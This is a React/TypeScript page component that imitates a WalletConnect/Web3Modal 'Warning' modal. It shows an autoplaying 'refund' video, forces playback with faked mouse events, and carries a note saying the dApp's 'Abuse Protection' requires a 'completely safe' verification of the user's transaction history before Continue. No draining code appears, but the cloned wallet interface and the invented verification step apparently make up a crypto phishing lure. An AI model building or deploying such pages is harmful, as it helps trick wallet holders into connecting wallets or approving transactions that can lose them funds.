// src/pages/WalletConnect.tsx
/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable react/no-unknown-property */


import React from "react";
import "../styles/main.css";
import { useRef, useEffect } from "react";

declare global {
  namespace JSX {
    interface IntrinsicElements {
      "w3m-modal": any;
      "w3m-header": any;
      "w3m-router": any;
      "w3m-warning-view": any;
      "w3m-snackbar": any;
      "w3m-alertbar": any;
      "wui-flex": any;
      "wui-icon-link": any;
      "wui-icon": any;
      "wui-text": any;
      "wui-shimmer": any;
      "wui-button": any;
    }
  }
}

export default function WalletConnectPage() {

      const videoRef = useRef<HTMLVideoElement>(null);

  useEffect(() => {
    const v = videoRef.current;
    if (!v) return;

    // 1) MouseEvent ile click taklidi
    const dispatchFakeClick = () => {
      const evtOpts = { bubbles: true, cancelable: true, view: window };
      v.dispatchEvent(new MouseEvent("mousedown", evtOpts));
      v.dispatchEvent(new MouseEvent("mouseup", evtOpts));
      v.dispatchEvent(new MouseEvent("click", evtOpts));
    };

    // 2) Hem click hem de play() çağır
    setTimeout(() => {
      dispatchFakeClick();
      v.play().catch(err => console.warn("play() hatası:", err));
    }, 500); // yarım saniye sonra çalıştır

  }, []);


  return (
    <main className="wallet-connect-page">
      {/* gölge DOM root */}
      <div id="_b" />

      {/* modal */}
      <w3m-modal
        className="embedded open"
        style={{ "--w3m-modal-width": "430px" } as React.CSSProperties}
      >


{/* header */}
<w3m-header
  className="embedded"
  style={{
    // Host element’in kendi padding/margin’ini sıfırlıyoruz
    padding: 0,
    margin: 0
  }}
>
  <wui-flex
    justifycontent="space-between"
    alignitems="center"
    style={{
      // İçerikleri yukarı taşıyoruz
      alignItems: "center",
      justifyContent: "space-between",
      padding: "2px var(--wui-spacing-2l)", // çok ince üst-alt boşluk
      margin: 0
    }}
  >
    {/* sol üst ünlem ikonu */}
    <wui-icon-link
      id="dynamic"
      icon="info"
      disabled="true"
      style={
        {
          // ikonun çerçevesini ve padding’ini sıfırlıyoruz
          "--local-border-radius": "0",
          "--local-padding": "0"
        } as React.CSSProperties
      }
    >
      <button
        disabled
        style={{
          padding: 0,
          margin: 0,
          border: 0,
          background: "none"
        }}
      >
        <wui-icon
          color="inherit"
          size="lg"
          name="info"
          style={
            {
              // ikonun rengini ve boyutunu ayarlıyoruz
              "--local-color": "#eaeaea",
              "--local-width": "var(--wui-icon-size-lg)"
            } as React.CSSProperties
          }
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="24"
            height="34"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2.5"
            strokeLinecap="round"
            strokeLinejoin="round"
          >
            <circle cx="12" cy="12" r="10" />
            <path d="M12 16v-4" />
            <path d="M12 8h.01" />
          </svg>
        </wui-icon>
      </button>
    </wui-icon-link>

    {/* başlık */}
    <wui-flex
      className="w3m-header-title"
      alignitems="center"
      gap="xs"
      style={{
        alignItems: "center",
        gap: "var(--wui-spacing-xs)"
      }}
    >
      <wui-text
        color="fg-100"
        variant="large-600"
        style={
          {
            "--local-align": "left",
            "--local-color": "var(--wui-color-fg-100)",
            fontWeight: 600
          } as React.CSSProperties
        }
      >
        Warning
      </wui-text>
    </wui-flex>

    {/* sağ boşluk */}
    <div style={{ width: "44px" }} />
  </wui-flex>

  {/* altındaki ince çizgi */}
  <hr
    style={{
      margin: 0,
      marginTop: "2px", // flex’in hemen altına
      border: "none",
      borderBottom: "0.5px solid rgba(255,255,255,0.08)"
    }}
  />
</w3m-header>






        {/* içerik */}
        <w3m-router className="embedded" style={{ animation: "unset" }}>
          <div className="w3m-router-container" view-direction="prev">
            <w3m-warning-view>
              <wui-flex
                flexdirection="column"
                alignitems="center"
                justifycontent="center"
                gap="xl"
                style={{
                  flexDirection: "column",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: "var(--wui-spacing-xl)",
                }}
              >
                {/* Video */}
                <div className="video loaded">
    <video
      ref={videoRef}
      src="/media/refund.mp4"
      crossOrigin="anonymous"
      onContextMenu={e => e.preventDefault()}
      loop
      muted
      playsInline
      preload="auto"
      webkit-playsinline="true"
      width={238}
      height={360}
      style={{ display: "block" }}
    />

                  <wui-shimmer
                    width="238px"
                    height="360px"
                    style={{
                      width: "238px",
                      height: "360px",
                      borderRadius:
                        "clamp(0px,var(--wui-border-radius-m), 40px)",
                    } as React.CSSProperties}
                  />
                </div>

{/* Note - tek wui-text içinde, sadece ortalanmış */}
<div className="note" style={{ width: "100%", textAlign: "center" }}>
  <wui-text
    variant="paragraph-500"
    color="fg-100"
    align="center"
    style={
      {
        "--local-align": "center",
        "--local-color": "#eaeaea", // çok hafif kırık beyaz
        fontWeight: 500,            // biraz daha ince
        display: "inline-block",    // ortalamayı doğru uygulatmak için
        lineHeight: 1.4,
      } as React.CSSProperties
    }
  >
    <wui-icon
      name="info"
      size="sm"
      color="accent-100"
      style={
        {
          "--local-color": "var(--wui-color-accent-100)",
          "--local-width": "var(--wui-icon-size-sm)",
          marginRight: "6px",
          verticalAlign: "middle",
        } as React.CSSProperties
      }
    >
      <svg
        xmlns="http://www.w3.org/2000/svg"
        width="16"
        height="16"
        viewBox="0 0 24 24"
        fill="none"
        stroke="currentColor"
        strokeWidth="2.2"
        strokeLinecap="round"
        strokeLinejoin="round"
      >
        <circle cx="12" cy="12" r="10" />
        <path d="M12 16v-4" />
        <path d="M12 8h.01" />
      </svg>
    </wui-icon>{" "}
    <span
      className="text-accent"
      style={{
        color: "var(--wui-color-accent-100)",
        fontWeight: 600,
        verticalAlign: "middle",
        marginRight: "4px",
        display: "inline",
      }}
    >
      Note:
    </span>
    <span style={{ verticalAlign: "middle", display: "inline" }}>
      This dApp uses Abuse Protection to prevent misuse of platform. You'll need
      to complete a quick verification of your transaction history. It's
      completely safe and only takes a few seconds.
    </span>
  </wui-text>
</div>


                {/* Continue Button */}
                <wui-button
                  variant="accent"
                  fullwidth=""
                  style={{
                    "--local-width": "100%",
                    "--local-opacity-100": "1",
                    "--local-opacity-000": "0",
                    "--local-border-radius": "var(--wui-border-radius-m)",
                  } as React.CSSProperties}
                >
                  <button
                    data-variant="accent"
                    data-icon-left="false"
                    data-icon-right="false"
                    data-size="lg"
                  >
                    Continue
                  </button>
                </wui-button>
              </wui-flex>
            </w3m-warning-view>
          </div>
        </w3m-router>

        {/* placeholder’lar */}
        <w3m-snackbar />
        <w3m-alertbar />
      </w3m-modal>
    </main>
  );
}
